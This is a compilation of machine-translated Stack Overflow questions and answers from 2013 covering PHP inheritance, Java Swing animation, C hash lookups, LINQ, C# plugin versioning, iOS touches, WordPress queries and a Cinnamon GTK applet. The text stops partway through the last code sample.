这是[在 PyCharm 的网站上找到的](http://www.jetbrains.com/pycharm/webhelp/running-tasks-of-manage-py-utility.html)。

# php - 真正的多类继承，而不是通过特征的方法集合

> ID：15443530
> 
> 赞同：0
> 
> 时间：2013-03-15T23:10:30.830
> 
> 标签：php

我理解你`extend`上课的方式`ChildClass extends ParentClass`，我理解 and 的用法`class abstraction`，`interfaces`我也理解`traits`

在我读过的文章中，大多数人都表示，在实践中使用特征来实现`extends`功能无法完成的多重继承，因为它只支持单个扩展。

据我了解，特征更多的是可以由不同类或其他特征使用的函数集合。

在这个问题中，我请你告诉我如何正确地扩展多个类而不添加一些函数集合。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T23:14:08.457

我可以非常清楚这一点：

PHP*不允许*这样做。

我确实相信特质提供了一种在某些受限条件下实现多重继承的方法。如果您的代码库是非常纯粹的 OOP 且设计良好，那么特征可能允许您实现多重继承。

但这并不是万能的。如果这对您来说是一个绊脚石，请不要将其归咎于 PHP 的设计，您可能需要考虑一种不同的方式来做您想做的事。（例如：委托而不是子类）。

# java - 如何在Java中使图像从左向右移动

> ID：15443533
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:03.117
> 
> 标签：java, netbeans

到目前为止，我已经创建了下面的类，但是，现在我想插入一个代码来使图像从左到右和从右到左滑动。我通常会使用滑动平台，但是当我尝试实现它时它不起作用。我仍然是java的初学者，所以我很感谢你的帮助。

这是我的 Java 类的代码：

```
package game;

import city.soi.platform.*;

public class Enemy extends Body implements CollisionListener{

private Game game ;

    public Enemy(Game g){
        super(g.getWorld(), new PolygonShape(-27.0f,25.0f, -27.0f,-24.0f, 25.0f,-24.0f, 26.0f,25.0f, -27.0f,25.0f));
        setImage(new BodyImage("images/enemy.png"));
        g.getWorld().addCollisionListener(this);    
        game = g;
    }

    public void collide(CollisionEvent e) {
        if (e.getOtherBody() == game.getPlayer()){
         game.getPlayer().subtractFromScore(75);
         System.out.println("You have just lossed 75 Points! Current Score =  " + game.getPlayer().getScore());
         this.destroy();
     }
  }
} 
```

为了清楚起见，我希望每个人都将这个课程包含在一个从左到右移动的平台上。

非常感谢，

萌

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:50:27.403

这在很大程度上取决于您的个人要求，但基本概念将保持不变。

Swing 中的任何类型的动画都必须在不阻塞事件调度线程的情况下执行。EDT 上的任何阻塞操作都将阻止处理任何重绘请求（除其他外）。

这个简单的例子使用`javax.swing.Timer`每 40 毫秒左右（大约 25 fps）滴答的 a 并更新一个小“球”的位置

更复杂的迭代需要专门的`Thread`. 这使得整个过程更加复杂，因为

1.  您不应该从除 EDT 之外的任何线程更新/创建/修改/更改任何 UI 组件（或 UI 可能需要执行绘画的属性）
2.  您无法控制油漆过程。这意味着任何时候都可能发生重绘，如果您正在修改绘制过程渲染游戏状态所需的任何属性/对象，则可能会导致不一致。

.

```
public class SimpleBouncyBall {

    public static void main(String[] args) {
        new SimpleBouncyBall();
    }

    public SimpleBouncyBall() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (Exception ex) {
                }

                JFrame frame = new JFrame("Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.add(new CourtPane());
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

    public class CourtPane extends JPanel {

        private Ball ball;
        private int speed = 5;

        public CourtPane() {
            Timer timer = new Timer(40, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    Rectangle bounds = new Rectangle(new Point(0, 0), getSize());
                    if (ball == null) {
                        ball = new Ball(bounds);
                    }
                    speed = ball.move(speed, bounds);
                    repaint();
                }
            });
            timer.setRepeats(true);
            timer.setCoalesce(true);
            timer.start();
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(100, 100);
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g); 
            if (ball != null) {
                Graphics2D g2d = (Graphics2D) g.create();
                g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                Point p = ball.getPoint();
                g2d.translate(p.x, p.y);
                ball.paint(g2d);
                g2d.dispose();
            }
        }

    }

    public class Ball {

        private Point p;
        private int radius = 12;

        public Ball(Rectangle bounds) {

            p = new Point();
            p.x = 0;
            p.y = bounds.y + (bounds.height - radius) / 2;

        }

        public Point getPoint() {
            return p;
        }

        public int move(int speed, Rectangle bounds) {

            p.x += speed;
            if (p.x + radius >= (bounds.x + bounds.width)) {

                speed *= -1;
                p.x = ((bounds.x + bounds.width) - radius) + speed;

            } else if (p.x <= bounds.x) {

                speed *= -1;
                p.x = bounds.x + speed;

            }

            p.y = bounds.y + (bounds.height - radius) / 2;

            return speed;

        }

        public void paint(Graphics2D g) {
            g.setColor(Color.RED);
            g.fillOval(0, 0, radius, radius);
        }

    }

} 
```

# c - C 从列表中查找字符串的子集

> ID：15443534
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:03.703
> 
> 标签：c, search

我有一个 1M 条目的列表，我想排除其中 20,000 个条目的子集（这两个列表的顺序不同，因为它们具有相同的键（字符串））。任何人都可以在 C 中建议一个快速搜索算法来做到这一点吗？

我不想每次都阅读每一个 20K ID 并查看 1M 的列表。任何建议都是最有帮助的。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:28:30.693

您要使用的是哈希集。哈希集是哈希表的一种特殊情况，它基本上以恒定时间记录集合中是否存在元素。所以，你要做的就是将你的 20k 个 ID 插入哈希集中，然后遍历 100 万个字符串，看看它们是否存在于哈希集中。

供您参考，这是 C 中哈希集的实现：[https ://github.com/avsej/hashset.c](https://github.com/avsej/hashset.c)

您的运行时间将是 O(n)，因为对于 1M 字符串的每次检查，这将是恒定时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:16:27.603

首先对两个列表进行排序。然后你可以一起遍历它们，将列表中的指针推进到另一个指针后面。

你必须使用C吗？这听起来像是 Perl 的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:30:35.257

在开始搜索列表之前，将 20,000 个键包含在[哈希表中。](http://en.wikipedia.org/wiki/Hash_table)然后对于列表中每个项目的键，如果在哈希表中找到该键，则从列表中排除该项目。

# c# - 从 IQueryble 转换 到 T

> ID：15443535
> 
> 赞同：3
> 
> 时间：2013-03-15T23:11:07.540
> 
> 标签：c#, .net, linq, converter, iqueryable

```
public DoctorClass GetById(int id)
    {
        using (var context = new EmrContext())
        {
            var query = from d in context.Doctors
                        join c in context.Users on d.Id equals c.Id
                        where d.Id==id
                        select new DoctorClass { Email = c.Email, FirstName = c.FirstName, LastName = c.LastName, Post = d.Post };
            return query;
        }
    } 
```

这是错误：无法将类型“System.Linq.IQueryable”隐式转换为“Mvc.Models.DoctorClass”。存在显式转换（您是否缺少演员表？）

我需要用“查询”做什么来解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:12:49.183

[`Single()`](http://msdn.microsoft.com/en-us/library/system.linq.queryable.single.aspx)在这种情况下，您几乎可以肯定要使用：

```
return query.Single(); 
```

或者可能[`SingleOrDefault()`](http://msdn.microsoft.com/en-us/library/system.linq.queryable.singleordefault.aspx)：

```
return query.SingleOrDefault(); 
```

这是假设肯定只有一个这样的结果，如果有的话。（两者的区别在于如果*没有*匹配的记录会发生什么。`SingleOrDefault`将返回 null；`Single`将引发异常。

如果可以合法地进行多个匹配，您应该考虑您想要发生的事情。例如，您可以使用[`First()`](http://msdn.microsoft.com/en-us/library/system.linq.queryable.first.aspx)/ [`FirstOrDefault`](http://msdn.microsoft.com/en-us/library/system.linq.queryable.firstordefault.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:13:15.797

您正在返回`IQueryable<DoctorClass>`需要返回的地方`DoctorClass`：

你可以使用：

```
return query.FirstOrDefault(); 
```

这将返回`query`.

# c# - 具有向前和向后兼容性的插件架构

> ID：15443536
> 
> 赞同：5
> 
> 时间：2013-03-15T23:11:09.963
> 
> 标签：c#, plugins, backwards-compatibility, forward-compatibility

我目前正在开发将使用插件类型系统的 C# 产品。这并不是什么新鲜事，我已经看到很多关于如何使用接口来轻松实现此功能的信息。

我还看到了通过更新接口名称来实现向后兼容性的方法，例如：[版本之间的接口更改 - 如何管理？](https://stackoverflow.com/questions/9964312/interface-change-between-versions-how-to-manage)

关于主 exe 和插件之间的版本不匹配，我可以预见到我们的产品有多种情况。

1.  主程序与插件相同的插件版本
2.  主程序比插件更新
3.  主程序早于插件

从我已经能够收集到 1 和 2 工作的信息很好。但我一直无法弄清楚如何正确实现“前向”兼容性（3）。

我们打算只向插件 API 添加方法。

任何想法都会有很大帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T03:20:39.987

**隔离的 PluginAPI DLL**

首先，您的 PluginAPI（包含接口）应该是主应用程序的独立 DLL。您的主应用程序将引用 PluginAPI，每个插件都将引用 PluginAPI。你很可能已经在这样做了。

**接口版本控制**

其次，在结构上，每次添加新属性或方法时都应该创建一个新接口。

例如：

1.  版本 1：Plugins.IPerson
2.  版本 2：Plugins.V2.IPerson：Plugins.IPerson
3.  版本 3：Plugins.V3.IPerson：Plugins.V2.IPerson

在极少数情况下，您决定删除或完全重新设计 API，例如：

4.  Version 4: Plugins.V4.IPerson //没有任何接口继承

**隔离的 PluginAPI DLL 版本控制**

最后，我不是 100% 确定 PluginAPI .dll 的版本控制将如何进行，即使使用这种接口版本控制的结构架构。它可能有效

或者

您可能需要为每个版本提供匹配的 dll（每个都引用以前的版本）。我们将假设是这种情况。

**案例3的解决方案**

因此，现在让我们以您的案例 [3] 为例，主程序比插件更早：

*   Person Plugin 实现 Plugins.V2.IPlugin 并引用 V3 .dll（只是为了让它变得有趣）。
*   主程序引用 V1 .dll
*   插件文件夹将包含 V2 和 V3 插件 .dll
*   主应用程序文件夹将仅包含 V1 插件 .dll（以及其他文件）
*   主应用程序将通过 IPerson 接口的 V1 定义查找并加载 Person 插件和引用
*   当然，只有 V1 的方法和属性可以从插件访问到主应用程序
*   （可以通过反射访问其他方法 - 这不是您想要的）

**奖金更新**

**什么时候可以使用插件**

*   第三方扩展您的系统。如果这是一个选项，源代码会更好，或者如果它是基于网络的，则重定向到他们的 URL。这是许多软件项目的梦想，但您应该等到有感兴趣的第三方合作伙伴后再做额外的工作来构建插件框架。
*   用户可编辑的“脚本”。您不应该构建自己的脚本语言，而是应该针对应用程序域中的限制性接口编译用户 c# 代码，该接口非常严格（禁用反射和其他）。
*   安全分组 - 您的核心软件可能使用受信任的平台调用。风险更高的模块可以被分离到另一个库中，并且可以由最终用户选择性地排除。

**何时不使用插件**

我提倡少即是多。不要过度设计。如果您正在构建出色的模块化软件，请使用类和命名空间（不要被接口迷惑）。“模块化”意味着您正在努力遵守 SOLID 原则，但这并不意味着您需要插件架构。在许多情况下，即使是控制反转也是矫枉过正的。

如果您*计划*将来向第三方开放，请不要将其作为插件架构开始。您可以稍后分阶段构建插件框架：i）派生接口；ii) 在同一个项目中使用接口定义您的插件；iii) 使用插件加载器类加载您的内部插件；iv) 最后，您可以实现一个外部库加载器。这 4 个步骤中的每一个都为您提供了一个独立的工作系统，并将您推向一个完整的插件系统。

**热插拔插件**

在设计插件架构时，您可能有兴趣知道可以使插件可热插拔：

1.  无需释放内存 - 只需继续加载新插件即可。这通常很好，除非它可能是您期望 i) 运行很长时间而不重新启动的服务器软件；并且 ii) 预计在此期间会有许多插件更改和升级。当您在运行时加载插件时，它会将程序集加载到内存中并且无法卸载。参见 [2] 了解原因。

2.  使用释放内存 - 您可以卸载 AppDomain。AppDomain 在同一进程中运行，但引用隔离 - 您不能直接引用或调用对象。相反，调用必须进行编组，并且数据必须在 appdomain 之间进行序列化。如果您不打算经常更改插件，那么增加的复杂性是不值得的，有：i）由于编组/序列化导致的性能损失，ii）更多的编码复杂性（您不能简单地使用事件、委托和方法像往常一样），iii）这一切都会导致更多的错误并使调试更加困难。

因此，如果选项 [2] 吸引您，请先尝试 [1]，然后使用该架构，直到遇到 [2] 所需的问题。永远不要过度架构。相信我，我之前在大学期间构建了一个 [2] 架构，这很有趣，但在大多数情况下过度杀伤并且可能会扼杀你的项目（在非业务功能上花费太多时间）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:19:11.193

您需要假设您的插件仅实现公开的接口。如果您发布具有新界面的主程序的新版本，您将检查您的插件是否支持该界面。因此，如果将新插件呈现给旧版本的 main。它要么支持所请求的接口，要么不支持并且将作为有效插件失败测试。

# ios - 使用 touchesBegan 和 touchesEnded 作为 Swipe

> ID：15443537
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:17.433
> 
> 标签：ios, objective-c, cocoa-touch, uiview, uikit

我正在尝试查看用户是否从一个视图、标签等一直滑动到另一个视图、标签等。

这是我的相关代码

ViewController.h ：

```
@property (strong, nonatomic) IBOutlet UITextField *textField;
@property (strong, nonatomic) IBOutlet UILabel *swipeBegin;
@property (strong, nonatomic) IBOutlet UILabel *swipeEnd; 
```

TextField ：显示整个事情是否成功。
SwipeBegin ：滑动开始的标签。
SwipeEnd ：滑动应该结束的标签。

视图控制器.m：

```
- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event{
UITouch *touch = [touches anyObject];
if ([touch view] == swipeBegin) {
    gestureStartPointTouched = YES;
} 
```

如果滑动开始于“swipeBegin”，则布尔值设置为 YES。

```
- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event{
UITouch *touch = [touches anyObject];
if ([touch view] == swipeEnd) {        
    if (gestureStartPointTouched == YES) {
        [TextField setText:@"Success"];
    }
} 
```

如果我开始在“swipeBegin”处滑动，则调用 touchesBegan 方法 -> 工作正常

麻烦的部分是 touchesEnded 方法。

```
if([touch view] == swipeEnd) 
```

不管我怎么做都是假的。

有人有建议吗？

谢谢你 ！

# 解决方案

编辑 touchesEnded 方法：

```
- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event{
if ([self.view hitTest:[[touches anyObject] locationInView:self.view] withEvent:event] == SwipeEnd) {
    if (gestureStartPointTouched == YES) {
        [TextField setText:@"Success"];
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:26:11.333

触摸的视图永远不会改变，如果它从 swipeBegin 开始，那将永远是它的视图。如果您想通过触摸的结束位置找出它在哪里结束使用`hitTest:withEvent:`，那将返回您正在寻找的视图。

# c# - WPF 标签格式属性

> ID：15443538
> 
> 赞同：1
> 
> 时间：2013-03-15T23:11:20.850
> 
> 标签：c#, wpf, telerik

我有一个图表，其中显示了数百万和数十亿等大值。因此，`1000000`我不想以更易读的格式显示它，例如`1 mil`或`1 bil`

```
<telerik:RadCartesianChart.HorizontalAxis>
    <telerik:LinearAxis LabelFormat="" Foreground="#FF0094F7" Title="Revenue"/>
</telerik:RadCartesianChart.HorizontalAxis> 
```

我知道可以实现设置`LabelFormat`属性，但我不确定它是如何工作的。有人可以给我一个例子吗？谢谢！

# java - 试图仅在 2d 数组中反转行中的数字，给我错误并且不认为我做对了

> ID：15443539
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:22.577
> 
> 标签：java, arrays, loops, methods, reverse

我正在尝试做的只是反转每行中的数字，因此 row[0] 的列将被反转等。我想出了如何在网上看它们但无法弄清楚如何做我需要的事情做。另外它给了我一个空错误，我不知道为什么会这样，我的整个代码是：

```
import java.util.*;
import java.io.*;

public class Proj5 {
public static void main(String[] args)throws IOException{
    Scanner s = new Scanner(System.in);
    int [] quizKey = {1,1,2,2,1,1,3,2,4,1,3,5,4,1,2};
    String [] userAnswers = new String[100];
    String [] wid = new String[100];
    int [][] userIndividualAnswers = new int[quizKey.length][userAnswers.length];
    int [] numCorrect = new int[quizKey.length];
    int max;
    int min;

    int lines=0;
    readInText();
    s = readInText();
    while(s.hasNext()){
        String line = s.nextLine();
        String[] tokens = line.split(",");
        wid[lines] = tokens[0];
        userAnswers[lines] = tokens[1];
        lines ++;

    }// end while loop
    Long[][] userAnswersInt = new Long[lines][quizKey.length];
    numCorrect = gradeSingleQuiz(lines, quizKey, userAnswers, numCorrect, userAnswersInt);
    double[] percentCorrect = new double[lines];
    percentCorrect = percentCorrect(lines, numCorrect, quizKey);
    char[] grades = new char[lines];
    grades = grade(numCorrect, lines);
    max=max(numCorrect);
    min=min(numCorrect);

    displayOutput(wid, lines, numCorrect, grades, percentCorrect);
    averageScore(max, min, lines, percentCorrect);
}//end main

public static Scanner readInText()throws IOException{
    Scanner inFile = new Scanner(new File("QuizScores.txt"));
    return inFile;

}// end readInText

public static String[] userAnswers(String userAnswers[]){
    return userAnswers;
}

public static int[] gradeSingleQuiz(int lines, int quizKey[], String userAnswers[], int numCorrect[], Long userAnswersInt[][]){
    for (int j=0; j<lines; j++){
    numCorrect[j]=0;
        long[] ara = new long[quizKey.length];
        ara [j] = Long.parseLong(userAnswers[j]);
        for(int p=0; p<ara.length; p++){
            System.out.println(p);
            userAnswersInt[j][p]=ara[j]%10;
            ara[j]=ara[j]/10;
        }
        int rows = userAnswersInt.length;
        int cols = userAnswersInt[0].length;
        long[][] userAnswersReverse = new long[rows][cols];
        for(int q=rows-1; q>=0;q--){
            for(int w = cols-1; w >=0; w++){
                userAnswersReverse[rows-1-q][cols-1-q] = userAnswersInt[q][w];

System.out.print(userAnswersReverse[q][w]);
            }
        }
        for(int n=0; n<quizKey.length; n++){
            System.out.println(userAnswersInt[j][n]);
            if(userAnswersInt[j][n].equals(quizKey[n])){
                    numCorrect[j]++;    
            }
        }
    }//end for loop

return numCorrect;
}// end gradeSingleQuiz

public static int max(int numCorrect[]){
    int max = numCorrect[0];
    for(int r=1; r<numCorrect.length; r++){
        if(numCorrect[r]>max){

max=numCorrect[r];
        }
    }
return max;
}

public static int min(int numCorrect[]){
    int min = numCorrect[0];
    for(int r=1; r<numCorrect.length; r++){
        if(numCorrect[r]<min){
            min=numCorrect[r];
        }
    }

return min;
}

public static char[] grade(int numCorrect[], int lines){
    char[] grade = new char[lines];
    for (int j=0; j<lines; j++){

        if(numCorrect[j]>=14)
            grade[j]='A';
        else if((numCorrect[j]>=12)&&(numCorrect[j]<14))
            grade[j]='B';
        else if((numCorrect[j]>=11)&&(numCorrect[j]<12))

grade[j]='C';
        else if ((numCorrect[j]>=9)&&(numCorrect[j]<11))
            grade[j]='D';
        else
            grade[j]='F';
    }
    return grade;
}//end grade

public static double[] percentCorrect(int lines, int numCorrect[], int quizKey[]){
    double[] centCorrect = new double[100];
    for (int j=0; j<=lines; j++){
    centCorrect[j] = numCorrect[j]/quizKey.length;
    }
return centCorrect;
}

public static void averageScore(int min, int max, int lines, double percentCorrect[]){
    double add=0;
    for(int d=0; d<=lines; d++){    
        add = percentCorrect[d] + add;
    }//end for loop
    System.out.println("Average: " + add + "%");
    System.out.println("High Score: " + max);
    System.out.println("Low Score: " + min);
}// end averageScore

public static void displayOutput(String wid[], int lines, int numCorrect[], char grades[], double percentCorrect[]){
    System.out.println("Student ID    # Correct    %Correct    Grade");

for(int i=0; i<lines; i++){
        System.out.println("  " + wid[i] + "          " + numCorrect[i] + "          " +
                (percentCorrect[i]) + "%" + "       " + grades[i]); 
    }

}// end display output

}//end class 
```

我的重点是：

```
public static int[] gradeSingleQuiz(int lines, int quizKey[], String userAnswers[], int numCorrect[], Long userAnswersInt[][]){
    for (int j=0; j<lines; j++){
    numCorrect[j]=0;
        long[] ara = new long[quizKey.length];
        ara [j] = Long.parseLong(userAnswers[j]);
        for(int p=0; p<ara.length; p++){
            System.out.println(p);

userAnswersInt[j][p]=ara[j]%10;
            ara[j]=ara[j]/10;
        }
        int rows = userAnswersInt.length;
        int cols = userAnswersInt[0].length;
        long[][] userAnswersReverse = new long[rows][cols];
        for(int q=rows-1; q>=0;q--){
            for(int w = cols-1; w >=0; w++){
                userAnswersReverse[rows-1-q][cols-1-q] = userAnswersInt[q][w];
                System.out.print(userAnswersReverse[q][w]);
            }
        }
        for(int n=0; n<quizKey.length; n++){
            System.out.println(userAnswersInt[j][n]);
            if(userAnswersReverse[j][n]==(quizKey[n])){
                    numCorrect[j]++;    
            }
        }
    }//end for loop

return numCorrect;
}// end gradeSingleQuiz 
```

它给我的错误是：（我正在使用eclipse）

```
Exception in thread "main" java.lang.NullPointerException
at Proj5.gradeSingleQuiz(Proj5.java:65)
at Proj5.main(Proj5.java:27) 
```

第 65 行是：

```
userAnswersReverse[rows-1-q][cols-1-q] = userAnswersInt[q][w]; 
```

希望这是足够的信息让你们帮助我，并提前感谢，如果我需要包括其他任何内容，请告诉我。

编辑：

```
public static int[] gradeSingleQuiz(int lines, int quizKey[], String userAnswers[], int numCorrect[], Long userAnswersInt[][]){
    for (int j=0; j<lines; j++){
    numCorrect[j]=0;
        long[] ara = new long[quizKey.length];
        ara [j] = Long.parseLong(userAnswers[j]);
        for(int p=0; p<ara.length; p++){
            System.out.println(p);
            userAnswersInt[j][p]=ara[j]%10;
            ara[j]=ara[j]/10;
        }
        int rows = userAnswersInt.length;
            int cols = userAnswersInt[0].length;
            long[][] userAnswersReverse = new long[rows][cols];
        if(j==4){
            for(int q=0; q<userAnswersInt.length;q++){
            for(int w = cols-1; w >=0; w--){
                userAnswersReverse[q][cols-1-w] = userAnswersInt[q][w];
                System.out.print(userAnswersReverse[q][w]);
                }
            }
        }

if(j==4){
            for(int r=0; r<lines; r++){
                for(int n=0; n<quizKey.length; n++){
                    System.out.println(userAnswersReverse[r][n]);
                    if(userAnswersReverse[r][n]==(quizKey[n])){
                    numCorrect[r]++;    

}
                }
            }
        }   
    }//end for loop

return numCorrect;
}// end gradeSingleQuiz 
```

现在的问题是我的值没有得到正确返回知道为什么吗？这就是我现在得到的：

```
Student ID    # Correct    %Correct    Grade
 4563123          15          1.0%       A
 2312311          9          0.0%       D
 2312345          13          0.0%       B
 5527687          9          0.0%       D
 7867567          6          0.0%       F
Average: 1.0%
High Score: 0
Low Score: 15 
```

我从中提取的文件是：

```
4563123,112211324135412
2312311,222121324135211
2312345,112211324135421
5527687,212111313124412
7867567,111111111111111 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:38:25.303

你这里有几个错误。

导致 NullPointerException 的原因是您正在创建一个 Long[][] 类型的数组。默认情况下，此处的条目将为空。如果它是 "long[][]" - 小 'l' - 它们将是 0。这不会导致任何异常，但它可能仍然没有做你想做的事。

数组中的某些条目在函数的第 6-11 行初始化，但仅在第一行初始化，然后在导致问题的行上使用其中一个未初始化的空值。

也许循环结构意味着不同，以便在开始反转之前将第 6-11 行的代码应用于所有行和所有列？

您可能需要考虑的其他一些事项：

```
userAnswersReverse[rows-1-q][cols-1-q] = userAnswersInt[q][w]; 
```

您可能希望在赋值两侧的列索引中使用“w”而不是“q”。

*此外，考虑到您试图反转一行内*的值，而不是交换行的顺序，该行的索引是否应该在两边都相同？

另一个有问题的行：

```
for(int w = cols-1; w >=0; w++){ 
```

看起来你是在向上而不是向下数。

# php - 如何按类别获取最近的 X 个帖子？

> ID：15443542
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:39.723
> 
> 标签：php, wordpress

如何返回特定类别中最近 X 个帖子？我查看了 WP_Query() 但不确定需要哪些参数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T00:25:26.810

我会用这样的东西

参考：[http ://codex.wordpress.org/Template_Tags/get_posts](http://codex.wordpress.org/Template_Tags/get_posts)

```
<?php
global $post;
$args = array( 'numberposts' => 3, 'category' => 1 );
$lastposts = get_posts( $args );
foreach($lastposts as $post) : setup_postdata($post); ?>
    <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
    <?php the_content(); ?>
<?php endforeach; ?> 
```

# javascript - 在 PowerPoint 中，有两种动画，分别称为“渐变缩放”和“反弹”。如何将这些相同的动画应用于我网站上的图像？

> ID：15443543
> 
> 赞同：0
> 
> 时间：2013-03-15T23:11:59.990
> 
> 标签：javascript, jquery, html

如何将 PowerPoint 动画“淡化缩放”应用到网页上的图像，并将 PowerPoint 动画“反弹”到同一页面上的单独图像？当您第一次登陆网页时，图像开始动画化。完成动画后，它们将保持静止并在网页上可见。

我的猜测是我需要使用 JQuery。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:14:32.997

这应该有你正在寻找的一切[http://www.malsup.com/jquery/cycle/](http://www.malsup.com/jquery/cycle/)

# objective-c - 无法正确调整 UIImage 的大小

> ID：15443544
> 
> 赞同：0
> 
> 时间：2013-03-15T23:12:03.030
> 
> 标签：objective-c, cocoa-touch

我有一个用于玩纸牌游戏的 updateUI 方法，我在卡片背面添加了一张图片，但图片到处都是，我找不到问题..

这是我的方法：我如何调整它以匹配卡片大小？

```
- (void)updateUI {

    for (UIButton *cardButton in self.cardButtons) {
        Card *card = [self.game cardAtIndex:[self.cardButtons indexOfObject:cardButton]];
        [cardButton setTitle:card.contents forState:UIControlStateSelected];
        [cardButton setTitle:card.contents
                    forState:UIControlStateSelected|UIControlStateDisabled];
        cardButton.selected = card.isFaceUp;
        cardButton.enabled = !card.isUnplayable;
        cardButton.alpha = card.isUnplayable ? 0.3 : 1.0;

        cardButton.imageEdgeInsets = UIEdgeInsetsMake(2, 2, 2, 2);
        UIImage *cardBackImage = (cardButton.selected) ? nil : [UIImage imageNamed:@"benCardImag.png"];
        [cardButton setImage:cardBackImage forState:UIControlStateNormal];

    }

    self.scoreCounter.text = [NSString stringWithFormat:@"Score: %d", self.game.score];

    if (self.game.notification) {

        self.notificationLabel.text = self.game.notification;

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:17:55.387

使用`setBackgroundImage:forState:`而不是`setImage:forState:`. 图像被调整到文本的左侧，但背景图像被缩放以填充按钮。如果您想控制图像和文本的位置，您可能还想尝试自定义 UIControl 而不是 UIButton。

# applet - 无法从肉桂小程序打开 GtkWindow

> ID：15443549
> 
> 赞同：0
> 
> 时间：2013-03-15T23:12:28.107
> 
> 标签：applet, gtk, gjs

当我尝试从肉桂小程序打开 GtkWindow 时，整个桌面冻结。
文件中没有错误`~/.cinnamon/glass.log`。

```
const Gtk = imports.gi.Gtk;

function MyApplet(orientation)
{
    this._init(orientation);
}

MyApplet.prototype =
{
    __proto__: Applet.IconApplet.prototype,

    _init: function(orientation)
    {
        Applet.IconApplet.prototype._init.call(this, orientation);

        try {
            this.set_applet_icon_name("dialog-question");
            this.set_applet_tooltip("test");
        }
        catch (e) {
            global.logError(e);
        };
    },

    on_applet_clicked: function(event)
    {            
        Gtk.init(null, 0);

        let mwindow = new Gtk.Window ({type : Gtk.WindowType.TOPLEVEL});

        mwindow.title = "Hello World!";
        mwindow.connect ("destroy", function(){Gtk.main_quit()});

        mwindow.show();

        Gtk.main();
    }
};

function main(metadata, orientation)
{
    let myApplet = new MyApplet(orientation);
    return myApplet;
} 
```

代码一直执行，直到`Gtk.main()`没有窗口显示并且桌面被冻结。
任何人都知道如何使它正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T12:01:42.523

Javascript 不能做多线程，这就是调用`Gtk.main();`会破坏 Cinnamon 的原因。
Cinnamon 小程序已经运行了一个主循环，并且调用`Gtk.main();`尝试创建另一个。
所以不可能直接在 Javascript 中从肉桂小程序打开 GtkWindow。
解决方案可能是通过 Python 脚本打开 GtkWindow，并使用 DBus 在 Cinnamon 小程序和 Python/GTK 窗口之间进行通信。

[在 Cinnamon GitHub 中打开的问题](https://github.com/linuxmint/Cinnamon/issues/1801)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-21T09:13:33.807

您可以这样做：

```
const Gtk = imports.gi.Gtk;
const Util = imports.misc.util;

function MyApplet(orientation)
{
    this._init(orientation);
}

MyApplet.prototype =
{
    __proto__: Applet.IconApplet.prototype,

    _init: function(orientation)
    {
        Applet.IconApplet.prototype._init.call(this, orientation);

        try {
            this.set_applet_icon_name("dialog-question");
            this.set_applet_tooltip("test");
        }
        catch (e) {
            global.logError(e);
        };
    },

    on_applet_clicked: function(event)
    {            
        //path to your applet directory; hardcoded for now!
        let path="~/.local/share/cinnamon/applets/your_applet@you.org";
        //create in your applet directory a file "yourgtkfile.js" and
        //make it executable "chmod +x yourgtkfile.js"
        Util.spawnCommandLine(path + "/yourgtkfile.js");
    }
    };

    function main(metadata, orientation)
    {
        let myApplet = new MyApplet(orientation);
        return myApplet;
    } 
```

您可以将其复制/粘贴[到](https://gist.github.com/felipeborges/5129068)您的gtkfile.js 中。（将 #!/usr/bin/gjs 更改为 #!/usr/bin/cjs）

或者，这个（取自[此处](https://developer.gnome.org/gnome-devel-demos/3.7/helloWorld.js.html.en)）（将 #!/usr/bin/gjs 更改为 #!/usr/bin/cjs）：

```
#!/usr/bin/cjs

const Lang = imports.lang;
const Gtk = imports.gi.Gtk;

const Application = new Lang.Class({
    //A Class requires an explicit Name parameter. This is the Class Name.
    Name: 'Application',

    //create the application
    _init: function() {
        this.application = new Gtk.Application();

       //connect to 'activate' and 'startup' signals to handlers.
       this.application.connect('activate', Lang.bind(this, this._onActivate));
       this.application.connect('startup', Lang.bind(this, this._onStartup));
    },

    //create the UI
    _buildUI: function() {
        this._window = new Gtk.ApplicationWindow({ application: this.application,
                                                   title: "Hello World!" });
        this._window.set_default_size(200, 200);
        this.label = new Gtk.Label({ label: "Hello World" });
        this._window.add(this.label);
    },

    //handler for 'activate' signal
    _onActivate: function() {
        //show the window and all child widgets
        this._window.show_all();
    },

    //handler for 'startup' signal
    _onStartup: function() {
        this._buildUI();
    }
});

//run the application
